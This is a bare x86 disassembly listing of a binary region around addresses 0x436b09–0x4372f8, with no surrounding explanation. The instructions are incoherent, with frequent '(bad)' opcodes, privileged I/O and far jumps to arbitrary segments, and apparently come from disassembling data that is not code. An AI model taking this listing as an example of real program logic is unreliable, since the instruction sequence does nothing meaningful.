  436b09:	fist   DWORD PTR [edi+edx*1-0x18]
  436b0d:	addr16 push ds
  436b0f:	leave  
  436b10:	int3   
  436b11:	jnp    0x436b4b
  436b13:	mov    edi,0x60082c0a
  436b18:	mov    ebx,0xdecbe44
  436b1d:	push   eax
  436b1e:	call   0xe923:0x1a8ad85f
  436b25:	xchg   esp,eax
  436b26:	daa    
  436b27:	call   0x7514:0xea920063
  436b2e:	inc    esp
  436b2f:	sub    al,0xba
  436b31:	or     eax,0x85a8a51e
  436b36:	mov    dh,0x65
  436b38:	loop   0x436b84
  436b3a:	test   eax,0xbaa84cf2
  436b3f:	mov    ch,0x4b
  436b41:	xchg   edx,eax
  436b42:	je     0x436b2c
  436b44:	mov    eax,ds:0xda8827c8
  436b49:	lods   eax,DWORD PTR ds:[esi]
  436b4a:	ins    DWORD PTR es:[edi],dx
  436b4b:	in     eax,dx
  436b4c:	push   es
  436b4d:	sbb    DWORD PTR [ebx],edi
  436b4f:	jg     0x436b37
  436b51:	inc    esp
  436b52:	(bad)
  436b55:	sub    al,0xd8
  436b57:	adc    BYTE PTR [eax],al
  436b59:	aaa    
  436b5a:	mov    ebp,0x5dc0a966
  436b5f:	jmp    0xa92bc6d4
  436b64:	lods   eax,DWORD PTR ds:[esi]
  436b65:	xchg   esp,eax
  436b66:	xchg   ecx,eax
  436b67:	sbb    dh,BYTE PTR [ebx+0x6db05bf6]
  436b6d:	ins    DWORD PTR es:[edi],dx
  436b6e:	pop    es
  436b6f:	sub    al,0xc8
  436b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436b72:	sub    edx,ebx
  436b74:	and    DWORD PTR [edx-0x2393ffb8],ebp
  436b7a:	pop    edx
  436b7b:	dec    ecx
  436b7c:	out    0xae,al
  436b7e:	pushf  
  436b7f:	add    ebx,esi
  436b81:	lea    ebp,[esi]
  436b83:	sub    dh,BYTE PTR [esi]
  436b85:	sbb    DWORD PTR [edi],ebx
  436b87:	cmp    al,0x76
  436b89:	jno    0x436bc7
  436b8b:	stos   BYTE PTR es:[edi],al
  436b8c:	and    eax,0x2c22a5a8
  436b91:	nop
  436b92:	gs inc ecx
  436b94:	sbb    esp,DWORD PTR [eax-0x56]
  436b97:	sub    DWORD PTR [esi],ecx
  436b99:	pop    ebx
  436b9a:	mov    ebp,0x5c131c39
  436b9f:	push   0xb
  436ba1:	mov    eax,0x689ecb97
  436ba6:	xor    BYTE PTR [ecx],dl
  436ba8:	add    ch,BYTE PTR [esi+0x6d]
  436bab:	popa   
  436bac:	adc    eax,0x897d3432
  436bb1:	or     ebp,DWORD PTR [ebp-0x4aea295c]
  436bb7:	test   eax,0xcc7df8c4
  436bbc:	mul    ebx
  436bbe:	outs   dx,BYTE PTR ds:[esi]
  436bbf:	or     ecx,DWORD PTR [ebx]
  436bc1:	fisttp DWORD PTR [ebx+esi*4+0x78]
  436bc5:	sub    edx,DWORD PTR [ebp+0x34]
  436bc8:	(bad)  
  436bc9:	jp     0x436b88
  436bcb:	pop    esp
  436bcc:	jno    0x436ba9
  436bce:	mov    edx,0x9bbae380
  436bd3:	ror    BYTE PTR [eax],1
  436bd5:	gs or  al,0xb8
  436bd8:	mov    al,0xd1
  436bda:	adc    DWORD PTR [esi-0x20a8726a],ecx
  436be0:	test   DWORD PTR [edx+0x2a3b0540],eax
  436be6:	xor    al,0x22
  436be8:	sbb    eax,0xd8023a89
  436bed:	das    
  436bee:	cmc    
  436bef:	mov    WORD PTR [edi],es
  436bf1:	fild   WORD PTR [edx-0x4a]
  436bf4:	fisub  DWORD PTR [edi-0x109897a5]
  436bfa:	push   eax
  436bfb:	sub    eax,0xd88802d9
  436c00:	mov    ds:0xa7dd0076,al
  436c05:	push   ebp
  436c06:	leave  
  436c07:	push   edx
  436c08:	jle    0x436c43
  436c0a:	or     BYTE PTR ss:[ebp+0x6f3294a6],0x24
  436c12:	inc    ebx
  436c13:	js     0x436c71
  436c15:	call   0xc674644
  436c1a:	push   ebx
  436c1b:	imul   eax,edi,0x42ea1134
  436c21:	inc    ebx
  436c22:	inc    esp
  436c23:	xchg   ecx,eax
  436c24:	(bad)  
  436c25:	fs push ebx
  436c27:	cs pop ebp
  436c29:	inc    ebp
  436c2a:	mov    cl,0x1
  436c2c:	pop    eax
  436c2d:	in     al,0x35
  436c2f:	hlt    
  436c30:	fcmovnb st,st(1)
  436c32:	mov    dh,0x2d
  436c34:	ins    BYTE PTR es:[edi],dx
  436c35:	add    bl,BYTE PTR [esi]
  436c37:	mov    DWORD PTR [esi],0xe9e9849b
  436c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436c3e:	scas   al,BYTE PTR es:[edi]
  436c3f:	push   0xffffffbb
  436c41:	sbb    DWORD PTR [esp+edx*2],0x71
  436c45:	fiadd  DWORD PTR [edx]
  436c47:	dec    ebx
  436c48:	fst    QWORD PTR ds:0x2a8aa9b4
  436c4e:	or     bh,BYTE PTR [eax-0x65e8b5e3]
  436c54:	pop    ebp
  436c55:	xor    al,0xbc
  436c57:	jle    0x436c1a
  436c59:	push   edx
  436c5a:	jns    0x436cac
  436c5c:	cmp    ch,al
  436c5e:	scas   al,BYTE PTR es:[edi]
  436c5f:	push   0xca28640b
  436c64:	addr16 sub esi,esi
  436c67:	sub    eax,0x432f1341
  436c6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436c6d:	pop    esi
  436c6e:	mov    dh,0xaa
  436c70:	add    dh,BYTE PTR [eax-0x3b1dd513]
  436c76:	icebp  
  436c77:	mov    eax,0x159e10bd
  436c7c:	cmp    ecx,DWORD PTR [eax]
  436c7e:	fdivr  DWORD PTR [esi]
  436c80:	in     al,0x88
  436c82:	(bad)  
  436c83:	push   eax
  436c84:	mov    ah,0x9c
  436c86:	test   BYTE PTR [ebx],al
  436c88:	fist   DWORD PTR [edx+0x57]
  436c8b:	push   ebp
  436c8c:	stos   BYTE PTR es:[edi],al
  436c8d:	push   cs
  436c8e:	and    esp,ebp
  436c90:	dec    ebp
  436c91:	mov    ds:0xb8abb05,eax
  436c96:	jae    0x436c58
  436c98:	aaa    
  436c99:	call   DWORD PTR [esi]
  436c9b:	iret   
  436c9c:	ins    DWORD PTR es:[edi],dx
  436c9d:	sbb    al,0x4
  436ca0:	rcl    DWORD PTR ds:0x6bc0d044,1
  436ca6:	pusha  
  436ca7:	pop    es
  436ca8:	jo     0x436c4d
  436caa:	or     esp,DWORD PTR [edi]
  436cac:	std    
  436cad:	pop    edx
  436cae:	xor    eax,0x55da4d58
  436cb3:	cmp    ebp,DWORD PTR [eax]
  436cb5:	js     0x436c79
  436cb7:	ret    0x48fd
  436cba:	push   ebp
  436cbb:	add    al,0x75
  436cbd:	mov    ds:0xc0909c09,eax
  436cc2:	inc    edi
  436cc3:	mov    edx,0x362a26db
  436cc8:	sbb    bh,BYTE PTR [eax-0x6a]
  436ccb:	mov    eax,ds:0x7c6e16a0
  436cd0:	inc    esi
  436cd1:	inc    ebx
  436cd2:	add    DWORD PTR [esp+ecx*4+0xb],ebp
  436cd6:	hlt    
  436cd7:	or     eax,0xe36163d2
  436cdc:	shl    BYTE PTR [edi-0x5f],cl
  436cdf:	sbb    BYTE PTR [edx+0x21],dl
  436ce2:	xor    al,0x49
  436ce4:	fadd   DWORD PTR [edx+ebp*2-0x5f122eed]
  436ceb:	add    dh,cl
  436ced:	fwait
  436cee:	adc    BYTE PTR [esi-0x17a52725],ah
  436cf4:	and    bl,cl
  436cf6:	mov    al,ds:0x8b82e116
  436cfb:	bound  eax,QWORD PTR [edi]
  436cfd:	adc    al,0x17
  436cff:	int3   
  436d00:	add    eax,0x430f1715
  436d05:	inc    edi
  436d06:	add    BYTE PTR [ebp-0x60],ch
  436d09:	mov    al,ds:0x1a56a4f
  436d0e:	test   al,0xa3
  436d10:	pusha  
  436d11:	fst    DWORD PTR [edi-0x7d58f1e8]
  436d17:	cmp    ch,BYTE PTR [eax+0x34c32762]
  436d1d:	push   esi
  436d1e:	mov    ebx,0xafea5850
  436d23:	adc    ah,bl
  436d25:	test   eax,0x4d6ac213
  436d2a:	aad    0xa6
  436d2c:	loopne 0x436d17
  436d2e:	pop    ebp
  436d2f:	or     al,0xa3
  436d31:	sub    BYTE PTR [ebp+0x6e8006fc],cl
  436d37:	ins    BYTE PTR es:[edi],dx
  436d38:	mov    dh,0x5d
  436d3a:	add    esp,DWORD PTR [esi-0x15]
  436d3d:	fwait
  436d3e:	mov    eax,0xdec04075
  436d43:	sbb    BYTE PTR [edi],ch
  436d45:	jne    0x436dbe
  436d47:	aam    0x83
  436d49:	inc    ebp
  436d4a:	mov    bh,0x6
  436d4c:	or     ch,BYTE PTR [esi]
  436d4e:	push   ebp
  436d4f:	pop    ss
  436d50:	sub    DWORD PTR [edx+0x762281b],ecx
  436d56:	cli    
  436d57:	jle    0x436cfb
  436d59:	fistp  DWORD PTR [ebp+0x4453b6e5]
  436d5f:	ins    DWORD PTR es:[edi],dx
  436d60:	add    eax,0xa86cfda
  436d65:	pop    ebx
  436d66:	add    edx,DWORD PTR [esp+ebx*8]
  436d69:	mov    bl,0x57
  436d6b:	popa   
  436d6c:	loop   0x436d67
  436d6e:	xor    eax,0xbb5ba23c
  436d73:	ins    DWORD PTR es:[edi],dx
  436d74:	retf   
  436d75:	test   eax,0x80b29c44
  436d7a:	lds    ebp,FWORD PTR [ecx-0x10]
  436d7d:	ins    DWORD PTR es:[edi],dx
  436d7e:	sub    DWORD PTR [edx+0x63f62f23],esp
  436d84:	pop    fs
  436d86:	arpl   bx,bx
  436d88:	mov    edx,0x1440f56d
  436d8d:	push   es
  436d8e:	rol    cl,1
  436d90:	stos   DWORD PTR es:[edi],eax
  436d91:	imul   edx,DWORD PTR [edx+0x2e85ca5],0x62
  436d98:	repz cs loopne 0x436d90
  436d9c:	in     eax,0xc2
  436d9e:	in     al,dx
  436d9f:	sbb    dl,0x1
  436da2:	dec    ebp
  436da3:	fnstcw WORD PTR [eax+0x2e]
  436da6:	adc    al,dh
  436da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436da9:	sbb    ebx,DWORD PTR [ebp+0x44]
  436dac:	and    BYTE PTR [esi+0x26b6ff8d],ch
  436db2:	push   ebp
  436db3:	mov    ah,0x2d
  436db5:	add    BYTE PTR [ecx+0x1b9423b0],al
  436dbb:	shl    DWORD PTR [esi+0x17276a75],0x2c
  436dc2:	sbb    DWORD PTR [ebx],0xffffffdc
  436dc5:	pop    edi
  436dc6:	in     eax,dx
  436dc7:	push   esi
  436dc8:	imul   ebp,DWORD PTR [eax-0x71],0xffffffe5
  436dcc:	cs push cs
  436dce:	mov    ch,0x9
  436dd0:	jge    0x436dc4
  436dd2:	and    esp,DWORD PTR [eax+0x3c056e2b]
  436dd8:	pop    ecx
  436dd9:	(bad)  
  436dda:	js     0x436e05
  436ddc:	fstp   QWORD PTR [edx+0x484060a8]
  436de2:	retf   
  436de3:	pop    esp
  436de4:	jae    0x436d6d
  436de6:	push   cs
  436de7:	mov    BYTE PTR ds:0xbf937e44,bl
  436ded:	mov    DWORD PTR [ebx-0x25],ebp
  436df0:	adc    ebx,ebx
  436df2:	jg     0x436e61
  436df4:	clc    
  436df5:	repnz add eax,0xbc29b407
  436dfb:	test   DWORD PTR [edx+0x56d822b],ebp
  436e01:	push   ebx
  436e02:	stos   BYTE PTR es:[edi],al
  436e03:	ins    DWORD PTR es:[edi],dx
  436e04:	inc    esi
  436e05:	mov    esi,0xd3a15bb5
  436e0a:	sbb    DWORD PTR ds:[esi+0x685c11e9],ecx
  436e11:	add    BYTE PTR [ebp*8-0x64a3b060],al
  436e18:	hlt    
  436e19:	push   ss
  436e1a:	inc    eax
  436e1b:	mov    esi,0xba22a328
  436e20:	ins    DWORD PTR es:[edi],dx
  436e21:	dec    ebp
  436e22:	add    DWORD PTR [ebx+0x7d0f35e3],ebx
  436e28:	fnsave [edi-0x28]
  436e2b:	add    BYTE PTR [ebp+0x20],ch
  436e2e:	or     DWORD PTR [ebx-0x24bd9d26],ecx
  436e34:	or     ecx,DWORD PTR [ebx]
  436e36:	(bad)
  436e3a:	sub    eax,0xa885e813
  436e3f:	mov    eax,DWORD PTR [eax-0x71bee6aa]
  436e45:	mov    al,0xed
  436e47:	mov    ah,BYTE PTR [edx-0x6148c38]
  436e4d:	mov    edi,0x52e228c9
  436e52:	inc    ebx
  436e53:	es jb  0x436e4e
  436e56:	jge    0x436df6
  436e58:	pusha  
  436e59:	add    edx,DWORD PTR [eax]
  436e5b:	ins    BYTE PTR es:[edi],dx
  436e5c:	jo     0x436e43
  436e5e:	std    
  436e5f:	ja     0x436e22
  436e61:	push   ss
  436e62:	arpl   WORD PTR [ebx],sp
  436e64:	jmp    0x1b4c:0xe42265aa
  436e6b:	lods   eax,DWORD PTR ds:[esi]
  436e6c:	push   eax
  436e6d:	lods   eax,DWORD PTR ds:[esi]
  436e6e:	ins    DWORD PTR es:[edi],dx
  436e6f:	loope  0x436e8b
  436e71:	or     DWORD PTR [eax-0x54],eax
  436e74:	ret    0x680e
  436e77:	pop    ebx
  436e78:	mov    ds:0xb35a635f,al
  436e7d:	call   0x8e13c66a
  436e82:	test   DWORD PTR [esi+0x21bd0df],esp
  436e88:	push   esi
  436e89:	pop    ds
  436e8a:	mov    edx,0x2256e2aa
  436e8f:	xchg   edi,eax
  436e90:	(bad)  
  436e92:	ins    BYTE PTR es:[edi],dx
  436e93:	dec    esi
  436e94:	add    eax,0x50dda371
  436e99:	loope  0x436ecd
  436e9b:	or     esp,esp
  436e9d:	icebp  
  436e9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436e9f:	adc    DWORD PTR ds:0x59771d00,ebp
  436ea5:	jmp    0x6f43:0x41b0bb72
  436eac:	je     0x436ef3
  436eae:	cmp    ecx,ebx
  436eb0:	outs   dx,BYTE PTR ds:[esi]
  436eb1:	cmp    esp,DWORD PTR cs:0x7f6023a0
  436eb8:	(bad)  [edx+0x26c01a3]
  436ebe:	cmp    BYTE PTR [ebx-0x62],0xb
  436ec2:	cmp    BYTE PTR [edx-0x4cca4560],bl
  436ec8:	nop
  436ec9:	push   0xf6f97a2a
  436ece:	jns    0x436eab
  436ed0:	add    ebp,ebx
  436ed2:	in     al,dx
  436ed3:	cs xchg edx,eax
  436ed5:	jae    0x436e7f
  436ed7:	and    ch,BYTE PTR [esp+esi*2]
  436eda:	add    BYTE PTR [ebx],bh
  436edc:	add    al,BYTE PTR [ebp-0x181d9c95]
  436ee2:	pushf  
  436ee3:	sbb    DWORD PTR [edi-0x48becddd],ebp
  436ee9:	out    0x54,al
  436eeb:	push   edi
  436eec:	mov    ebp,0x9622090f
  436ef1:	bound  ecx,QWORD PTR [ebp-0x54]
  436ef4:	adc    al,0xc0
  436ef6:	mov    dh,0xdb
  436ef8:	div    BYTE PTR [ebp+0x8fddc6c]
  436efe:	sti    
  436eff:	pop    edi
  436f00:	in     al,dx
  436f01:	xor    DWORD PTR [ecx+0x65],ebp
  436f04:	xor    DWORD PTR [ecx-0x50],eax
  436f07:	add    ebp,DWORD PTR [eax]
  436f09:	aas    
  436f0a:	arpl   WORD PTR [ecx+0x4a],cx
  436f0d:	inc    ebp
  436f0e:	pop    ebx
  436f0f:	fistp  DWORD PTR [ebp+0x68aad56c]
  436f15:	or     al,0x12
  436f17:	push   eax
  436f18:	inc    eax
  436f19:	aaa    
  436f1a:	xchg   esi,eax
  436f1b:	xchg   edx,eax
  436f1c:	jne    0x436eab
  436f1e:	mov    ds:0x2e88b661,al
  436f23:	fdiv   DWORD PTR [edi-0x8]
  436f26:	sbb    bh,BYTE PTR [esp-0x7e]
  436f2a:	clc    
  436f2b:	imul   esi,DWORD PTR [edi-0x54042fae],0x2f
  436f32:	xchg   esp,eax
  436f33:	in     al,dx
  436f34:	mov    al,0x38
  436f36:	fiadd  DWORD PTR ds:0x1f9e6170
  436f3c:	mov    ah,0x86
  436f3e:	fsubr  QWORD PTR [eax]
  436f40:	popf   
  436f41:	mov    cl,0xb5
  436f43:	scas   eax,DWORD PTR es:[edi]
  436f44:	or     bh,ch
  436f46:	shl    DWORD PTR [eax],0x38
  436f49:	and    al,0x2
  436f4b:	fwait
  436f4c:	mov    eax,DWORD PTR [edx]
  436f4e:	fs scas al,BYTE PTR es:[edi]
  436f50:	mov    DWORD PTR [edx],ebx
  436f52:	add    ebx,ebp
  436f54:	sub    al,BYTE PTR [ecx-0x13]
  436f57:	xor    esp,DWORD PTR [edx-0x5f]
  436f5a:	imul   edx,DWORD PTR [edx-0x3f],0x69715009
  436f61:	mov    eax,ds:0x5961855f
  436f66:	ins    DWORD PTR es:[edi],dx
  436f67:	xchg   esp,eax
  436f68:	es push 0xffffffbb
  436f6b:	xor    eax,0xa365b12e
  436f70:	cdq    
  436f71:	mov    eax,ds:0xd6db5b32
  436f76:	adc    ebp,edx
  436f78:	mov    esp,0x6201d254
  436f7d:	inc    esp
  436f7e:	and    edi,DWORD PTR [eax+edx*2+0x5f80a06d]
  436f85:	mov    gs,WORD PTR [edx-0x17]
  436f88:	mov    al,0xa3
  436f8a:	mov    BYTE PTR ds:0x186eb9b6,cl
  436f90:	mov    bh,BYTE PTR [esi]
  436f92:	push   cs
  436f93:	or     BYTE PTR [ebp+0x51],0x6d
  436f97:	jmp    0x7598eabe
  436f9c:	inc    ecx
  436f9d:	mov    bh,0xaa
  436f9f:	mov    DWORD PTR [ebx+0x25],eax
  436fa2:	and    edi,DWORD PTR [ecx]
  436fa4:	icebp  
  436fa5:	add    eax,DWORD PTR [edx-0x7f82b54a]
  436fab:	mov    edi,esi
  436fad:	push   ebx
  436fae:	sbb    BYTE PTR [edx+0x510314d8],cl
  436fb4:	aas    
  436fb5:	sbb    al,0x13
  436fb7:	les    eax,FWORD PTR [esi-0x2de0f7d6]
  436fbd:	shl    DWORD PTR [esi+0x3],0x11
  436fc1:	sbb    eax,DWORD PTR [eax-0x3a]
  436fc4:	aam    0x8a
  436fc6:	inc    ecx
  436fc7:	adc    al,al
  436fc9:	adc    dl,BYTE PTR [ebp+eax*8+0x41]
  436fcd:	es mov bh,0x3a
  436fd0:	test   al,0xd8
  436fd2:	lods   eax,DWORD PTR ds:[esi]
  436fd3:	and    BYTE PTR [edx],ch
  436fd5:	imul   esi,DWORD PTR [esi],0xbab5c291
  436fdb:	aam    0x10
  436fdd:	add    al,0xb2
  436fdf:	inc    esp
  436fe0:	aam    0xf4
  436fe2:	icebp  
  436fe3:	add    edi,DWORD PTR [eax]
  436fe5:	mov    ch,0xa3
  436fe7:	mov    dh,bl
  436fe9:	call   0x6d88:0xd8a3bdb
  436ff0:	sbb    al,0xdd
  436ff2:	pushf  
  436ff3:	mov    al,0xa7
  436ff5:	mov    ds:0xaa3b6b6d,al
  436ffa:	repnz pop ebx
  436ffc:	or     BYTE PTR [edi-0x6],al
  436fff:	shr    BYTE PTR ds:[ebp+0x47],1
  437003:	shl    DWORD PTR ds:0x59685603,1
  437009:	(bad)  
  43700a:	jp     0x436fa7
  43700c:	push   0x8c6c2ff9
  437011:	add    bh,0xaf
  437014:	lods   eax,DWORD PTR ds:[esi]
  437015:	add    BYTE PTR ds:0xd7b300bd,ah
  43701b:	cmp    dh,BYTE PTR ds:0xb83b140
  437021:	pop    ecx
  437022:	cdq    
  437023:	cmp    eax,eax
  437025:	mov    dh,0x8e
  437027:	mov    al,ds:0x276d89b8
  43702c:	cmp    edx,DWORD PTR [edi+0xd88c4cb]
  437032:	add    ebp,ebx
  437034:	fcmovu st,st(3)
  437036:	test   ecx,ebx
  437038:	inc    edi
  437039:	xchg   edx,eax
  43703a:	adc    al,0xd1
  43703c:	lods   eax,DWORD PTR ds:[esi]
  43703d:	test   eax,0x5a71ebbf
  437042:	es push eax
  437044:	ins    DWORD PTR es:[edi],dx
  437045:	ins    DWORD PTR es:[edi],dx
  437046:	xor    al,0x60
  437048:	loop   0x436fcb
  43704a:	mov    edx,0xc5328e6a
  43704f:	jbe    0x436ff2
  437051:	sub    DWORD PTR [ebp+0x55],0x47
  437055:	clc    
  437056:	cwde   
  437057:	popa   
  437058:	push   0x17
  43705a:	add    eax,0x38d72b3b
  43705f:	in     al,0xf8
  437061:	inc    edi
  437062:	aam    0x85
  437064:	lods   eax,DWORD PTR ds:[esi]
  437065:	sub    eax,eax
  437067:	mov    esp,0x21e88038
  43706c:	repz cmp al,BYTE PTR [edx+0xc6501d8]
  437073:	inc    eax
  437074:	push   esi
  437075:	fdiv   QWORD PTR [esi-0x43697571]
  43707b:	jecxz  0x4370c8
  43707d:	push   edi
  43707e:	ret    0x88a6
  437081:	jmp    0x60da:0x5d3edb68
  437088:	mov    al,ds:0x535ba06e
  43708d:	in     eax,dx
  43708e:	out    0x8c,al
  437090:	enter  0xf6d1,0x4d
  437094:	mov    ch,bh
  437096:	fcom   DWORD PTR [ebp-0x30]
  437099:	push   es
  43709a:	retf   
  43709b:	and    esi,DWORD PTR [esi-0x71]
  43709e:	out    0x94,al
  4370a0:	fstp   st(2)
  4370a2:	xchg   BYTE PTR [edx+0x41a4de7c],ah
  4370a8:	sub    al,0xb4
  4370aa:	in     al,dx
  4370ab:	add    bl,al
  4370ad:	ss add eax,0xcb196b32
  4370b3:	(bad)  
  4370b5:	mov    al,BYTE PTR [ebp+0x70660ba6]
  4370bb:	test   DWORD PTR [ebx-0x49ca92fe],ebp
  4370c1:	(bad)  [esi]
  4370c3:	mov    ecx,0xcabcd306
  4370c8:	ss int 0x4a
  4370cb:	jo     0x437081
  4370cd:	pop    ebx
  4370ce:	mov    ebx,0xdaa35d65
  4370d3:	mov    dh,0xec
  4370d5:	or     bl,0x69
  4370d8:	mov    eax,0x4c585df1
  4370dd:	cmp    esp,DWORD PTR [ebx-0x2ac4eb4b]
  4370e3:	pop    sp
  4370e5:	mov    ebx,0xd6ed5b4b
  4370ea:	int3   
  4370eb:	cmp    ch,ch
  4370ed:	xchg   ebp,eax
  4370ee:	or     BYTE PTR [esi],dl
  4370f0:	ret    0x2e32
  4370f3:	and    BYTE PTR [ebp-0x641ee4a5],0x7f
  4370fa:	popa   
  4370fb:	sub    esp,DWORD PTR [ebx]
  4370fd:	dec    ebp
  4370fe:	pop    eax
  4370ff:	stos   BYTE PTR es:[edi],al
  437100:	push   0x1f4a6c20
  437105:	stc    
  437106:	and    eax,DWORD PTR [eax+0x4318888f]
  43710c:	icebp  
  43710d:	mov    dh,0x6d
  43710f:	test   eax,0xb210f7b0
  437114:	pop    ss
  437115:	xchg   DWORD PTR [edx],ebx
  437117:	mov    cl,0x29
  437119:	sbb    esi,DWORD PTR [esi+0x10]
  43711c:	pop    ss
  43711d:	push   ss
  43711e:	jns    0x4370ec
  437120:	call   0xb624a55b
  437125:	les    esp,FWORD PTR [esi+0x2135b888]
  43712b:	sub    al,0xc2
  43712d:	xlat   BYTE PTR ds:[ebx]
  43712e:	je     0x4370bd
  437130:	add    BYTE PTR [esi],dh
  437132:	ficom  DWORD PTR [eax-0x3a]
  437135:	das    
  437136:	or     DWORD PTR ds:0x2f80d613,ecx
  43713c:	mov    dh,0x33
  43713e:	mov    WORD PTR [esi-0x1],ds
  437141:	ret    
  437142:	int3   
  437143:	mov    dh,0x68
  437145:	mov    al,ds:0x2919db8a
  43714a:	pop    edx
  43714b:	jbe    0x4370e7
  43714d:	mov    ebx,0xdb696368
  437152:	aas    
  437153:	ficomp DWORD PTR [edi+0x13]
  437156:	pop    esp
  437157:	add    DWORD PTR [edi+0xa29b4d2],esi
  43715d:	xchg   esi,eax
  43715e:	(bad)  
  437160:	xchg   esp,eax
  437161:	je     0x437161
  437163:	mov    bh,0xaf
  437165:	mov    dh,0x1d
  437167:	inc    ebx
  437168:	rcr    BYTE PTR [esi-0x5352d12c],0x4d
  43716f:	adc    eax,0xdb616a46
  437174:	dec    edx
  437175:	in     al,dx
  437176:	xchg   ebp,eax
  437177:	fistp  DWORD PTR [esi+0x3b414ff8]
  43717d:	mov    al,ds:0xfc1b2db6
  437182:	lds    ebx,FWORD PTR [edi]
  437184:	in     eax,dx
  437185:	mov    esi,0x4d880279
  43718a:	inc    esp
  43718b:	mov    BYTE PTR [edx],bh
  43718d:	inc    ebp
  43718e:	sbb    ebx,DWORD PTR [ebp+0x15]
  437191:	ins    DWORD PTR es:[edi],dx
  437192:	lods   al,BYTE PTR ds:[esi]
  437193:	push   ecx
  437194:	mov    bl,0x55
  437196:	sbb    eax,DWORD PTR [ebp+0x49]
  437199:	pop    edx
  43719a:	stos   BYTE PTR es:[edi],al
  43719b:	xchg   BYTE PTR [eax-0xd8f60ea],ch
  4371a1:	jb     0x437163
  4371a3:	ins    DWORD PTR es:[edi],dx
  4371a4:	jmp    0x437146
  4371a6:	inc    ebx
  4371a7:	lds    eax,FWORD PTR [ebx-0xda05539]
  4371ad:	pop    ebx
  4371ae:	mov    ebx,0x939e4435
  4371b3:	jp     0x437176
  4371b5:	cmp    edx,DWORD PTR [ebx+edx*2]
  4371b8:	dec    esp
  4371b9:	adc    DWORD PTR [ebp-0x5ea97dd7],esi
  4371bf:	xchg   esi,eax
  4371c0:	and    bl,bl
  4371c2:	jmp    0xe09e:0xdfc83628
  4371c9:	mov    ds:0x1a7758af,al
  4371ce:	push   eax
  4371cf:	inc    ebx
  4371d0:	jno    0x43719d
  4371d2:	or     eax,0x281fd878
  4371d7:	push   ebx
  4371d8:	pop    esp
  4371d9:	fadd   DWORD PTR [eax-0x5bc38f0c]
  4371df:	fsubr  QWORD PTR [esi+0x74]
  4371e2:	push   eax
  4371e3:	pop    ss
  4371e4:	aad    0x84
  4371e6:	and    DWORD PTR [ebx-0x34],ebp
  4371e9:	mov    cl,0x39
  4371eb:	aaa    
  4371ec:	adc    DWORD PTR [ebx],ebx
  4371ee:	sbb    dl,0x2
  4371f1:	mov    ebp,DWORD PTR [esi-0x127d841c]
  4371f7:	(bad)  
  4371f8:	push   esp
  4371f9:	test   al,0x5e
  4371fb:	aam    0xbb
  4371fd:	inc    ecx
  4371fe:	loopne 0x437230
  437200:	arpl   WORD PTR [edi-0x50],dx
  437203:	and    esi,edx
  437205:	jle    0x437251
  437207:	jge    0x4371bf
  437209:	(bad)  
  43720a:	adc    ah,BYTE PTR [ebx-0x3e92f4bc]
  437210:	(bad)  
  437211:	jo     0x437202
  437213:	jb     0x437202
  437215:	fidiv  DWORD PTR [esi+0x598c92db]
  43721b:	add    BYTE PTR [edi+edx*1-0x2c],0x5a
  437220:	or     BYTE PTR [esi-0x7b],cl
  437223:	(bad)  
  437224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437225:	and    al,BYTE PTR [esi+0x43]
  437228:	fs stc 
  43722a:	loop   0x437272
  43722c:	fist   DWORD PTR ds:0x47d147c0
  437232:	mov    bh,0x35
  437234:	dec    BYTE PTR [ebp-0x157e5c90]
  43723a:	fidivr WORD PTR [edi+0x36dbeed1]
  437240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437241:	adc    ah,bl
  437243:	pop    edx
  437244:	jnp    0x43726c
  437246:	lahf   
  437247:	cmp    esp,DWORD PTR [ecx+eax*1-0x47291d14]
  43724e:	shr    BYTE PTR [eax-0x35],1
  437251:	mov    fs,WORD PTR [ecx-0x188edbae]
  437257:	icebp  
  437258:	ins    DWORD PTR es:[edi],dx
  437259:	dec    edi
  43725a:	fwait
  43725b:	mov    al,ds:0x9b7a950a
  437260:	(bad)  
  437262:	repnz inc ecx
  437264:	fwait
  437265:	and    BYTE PTR [eax+0x4230a91d],bh
  43726b:	imul   edi,DWORD PTR [edi+0x3696828],0x26ef0836
  437275:	cmp    dh,dl
  437277:	inc    esi
  437278:	sub    ebx,DWORD PTR [ecx-0x512ea788]
  43727e:	adc    bp,WORD PTR [ebp-0x47245ddf]
  437285:	pop    esp
  437286:	test   eax,0x145ea2e2
  43728b:	ins    DWORD PTR es:[edi],dx
  43728c:	imul   ebx,ebx,0xffffffb6
  43728f:	add    eax,DWORD PTR [ecx+0x71]
  437292:	ja     0x4372f5
  437294:	mov    DWORD PTR [ecx],eax
  437296:	xchg   ecx,eax
  437297:	(bad)  
  437298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437299:	jbe    0x4372fc
  43729b:	imul   esi,DWORD PTR [edi-0x68e861e6],0xfffffffe
  4372a2:	out    dx,eax
  4372a3:	test   BYTE PTR [ebp+0x76c814c9],al
  4372a9:	fxch   st(2)
  4372ab:	(bad)  
  4372ac:	xchg   ebx,eax
  4372ad:	pop    edx
  4372ae:	jnp    0x43730f
  4372b0:	rol    DWORD PTR [ecx],1
  4372b2:	add    al,0xb3
  4372b4:	add    BYTE PTR [edx-0x40],0xc7
  4372b8:	mov    ebp,0x631bb045
  4372bd:	mov    eax,ds:0x8fc40d40
  4372c2:	jmp    0x437333
  4372c4:	and    al,0x85
  4372c6:	(bad)  
  4372c7:	jbe    0x43732c
  4372c9:	and    bl,BYTE PTR [ecx-0x53a6aa31]
  4372cf:	aad    0x28
  4372d1:	pusha  
  4372d2:	push   edi
  4372d3:	aam    0x8d
  4372d5:	test   BYTE PTR fs:[ebx],bh
  4372d8:	xchg   edi,eax
  4372d9:	js     0x4372d1
  4372db:	xor    eax,ecx
  4372dd:	push   edi
  4372de:	sbb    eax,DWORD PTR [edx]
  4372e0:	push   esp
  4372e1:	ret    
  4372e2:	cmp    bl,BYTE PTR ds:0xd85b70ac
  4372e8:	push   0xdf3e99c1
  4372ed:	(bad)  
  4372ee:	fimul  DWORD PTR [ecx+0x30d0152b]
  4372f4:	inc    eax
  4372f5:	xchg   BYTE PTR [esi-0x50],dl
  4372f8:	add    DWORD PTR [edx-0xdfc50b3],0xffffffb3
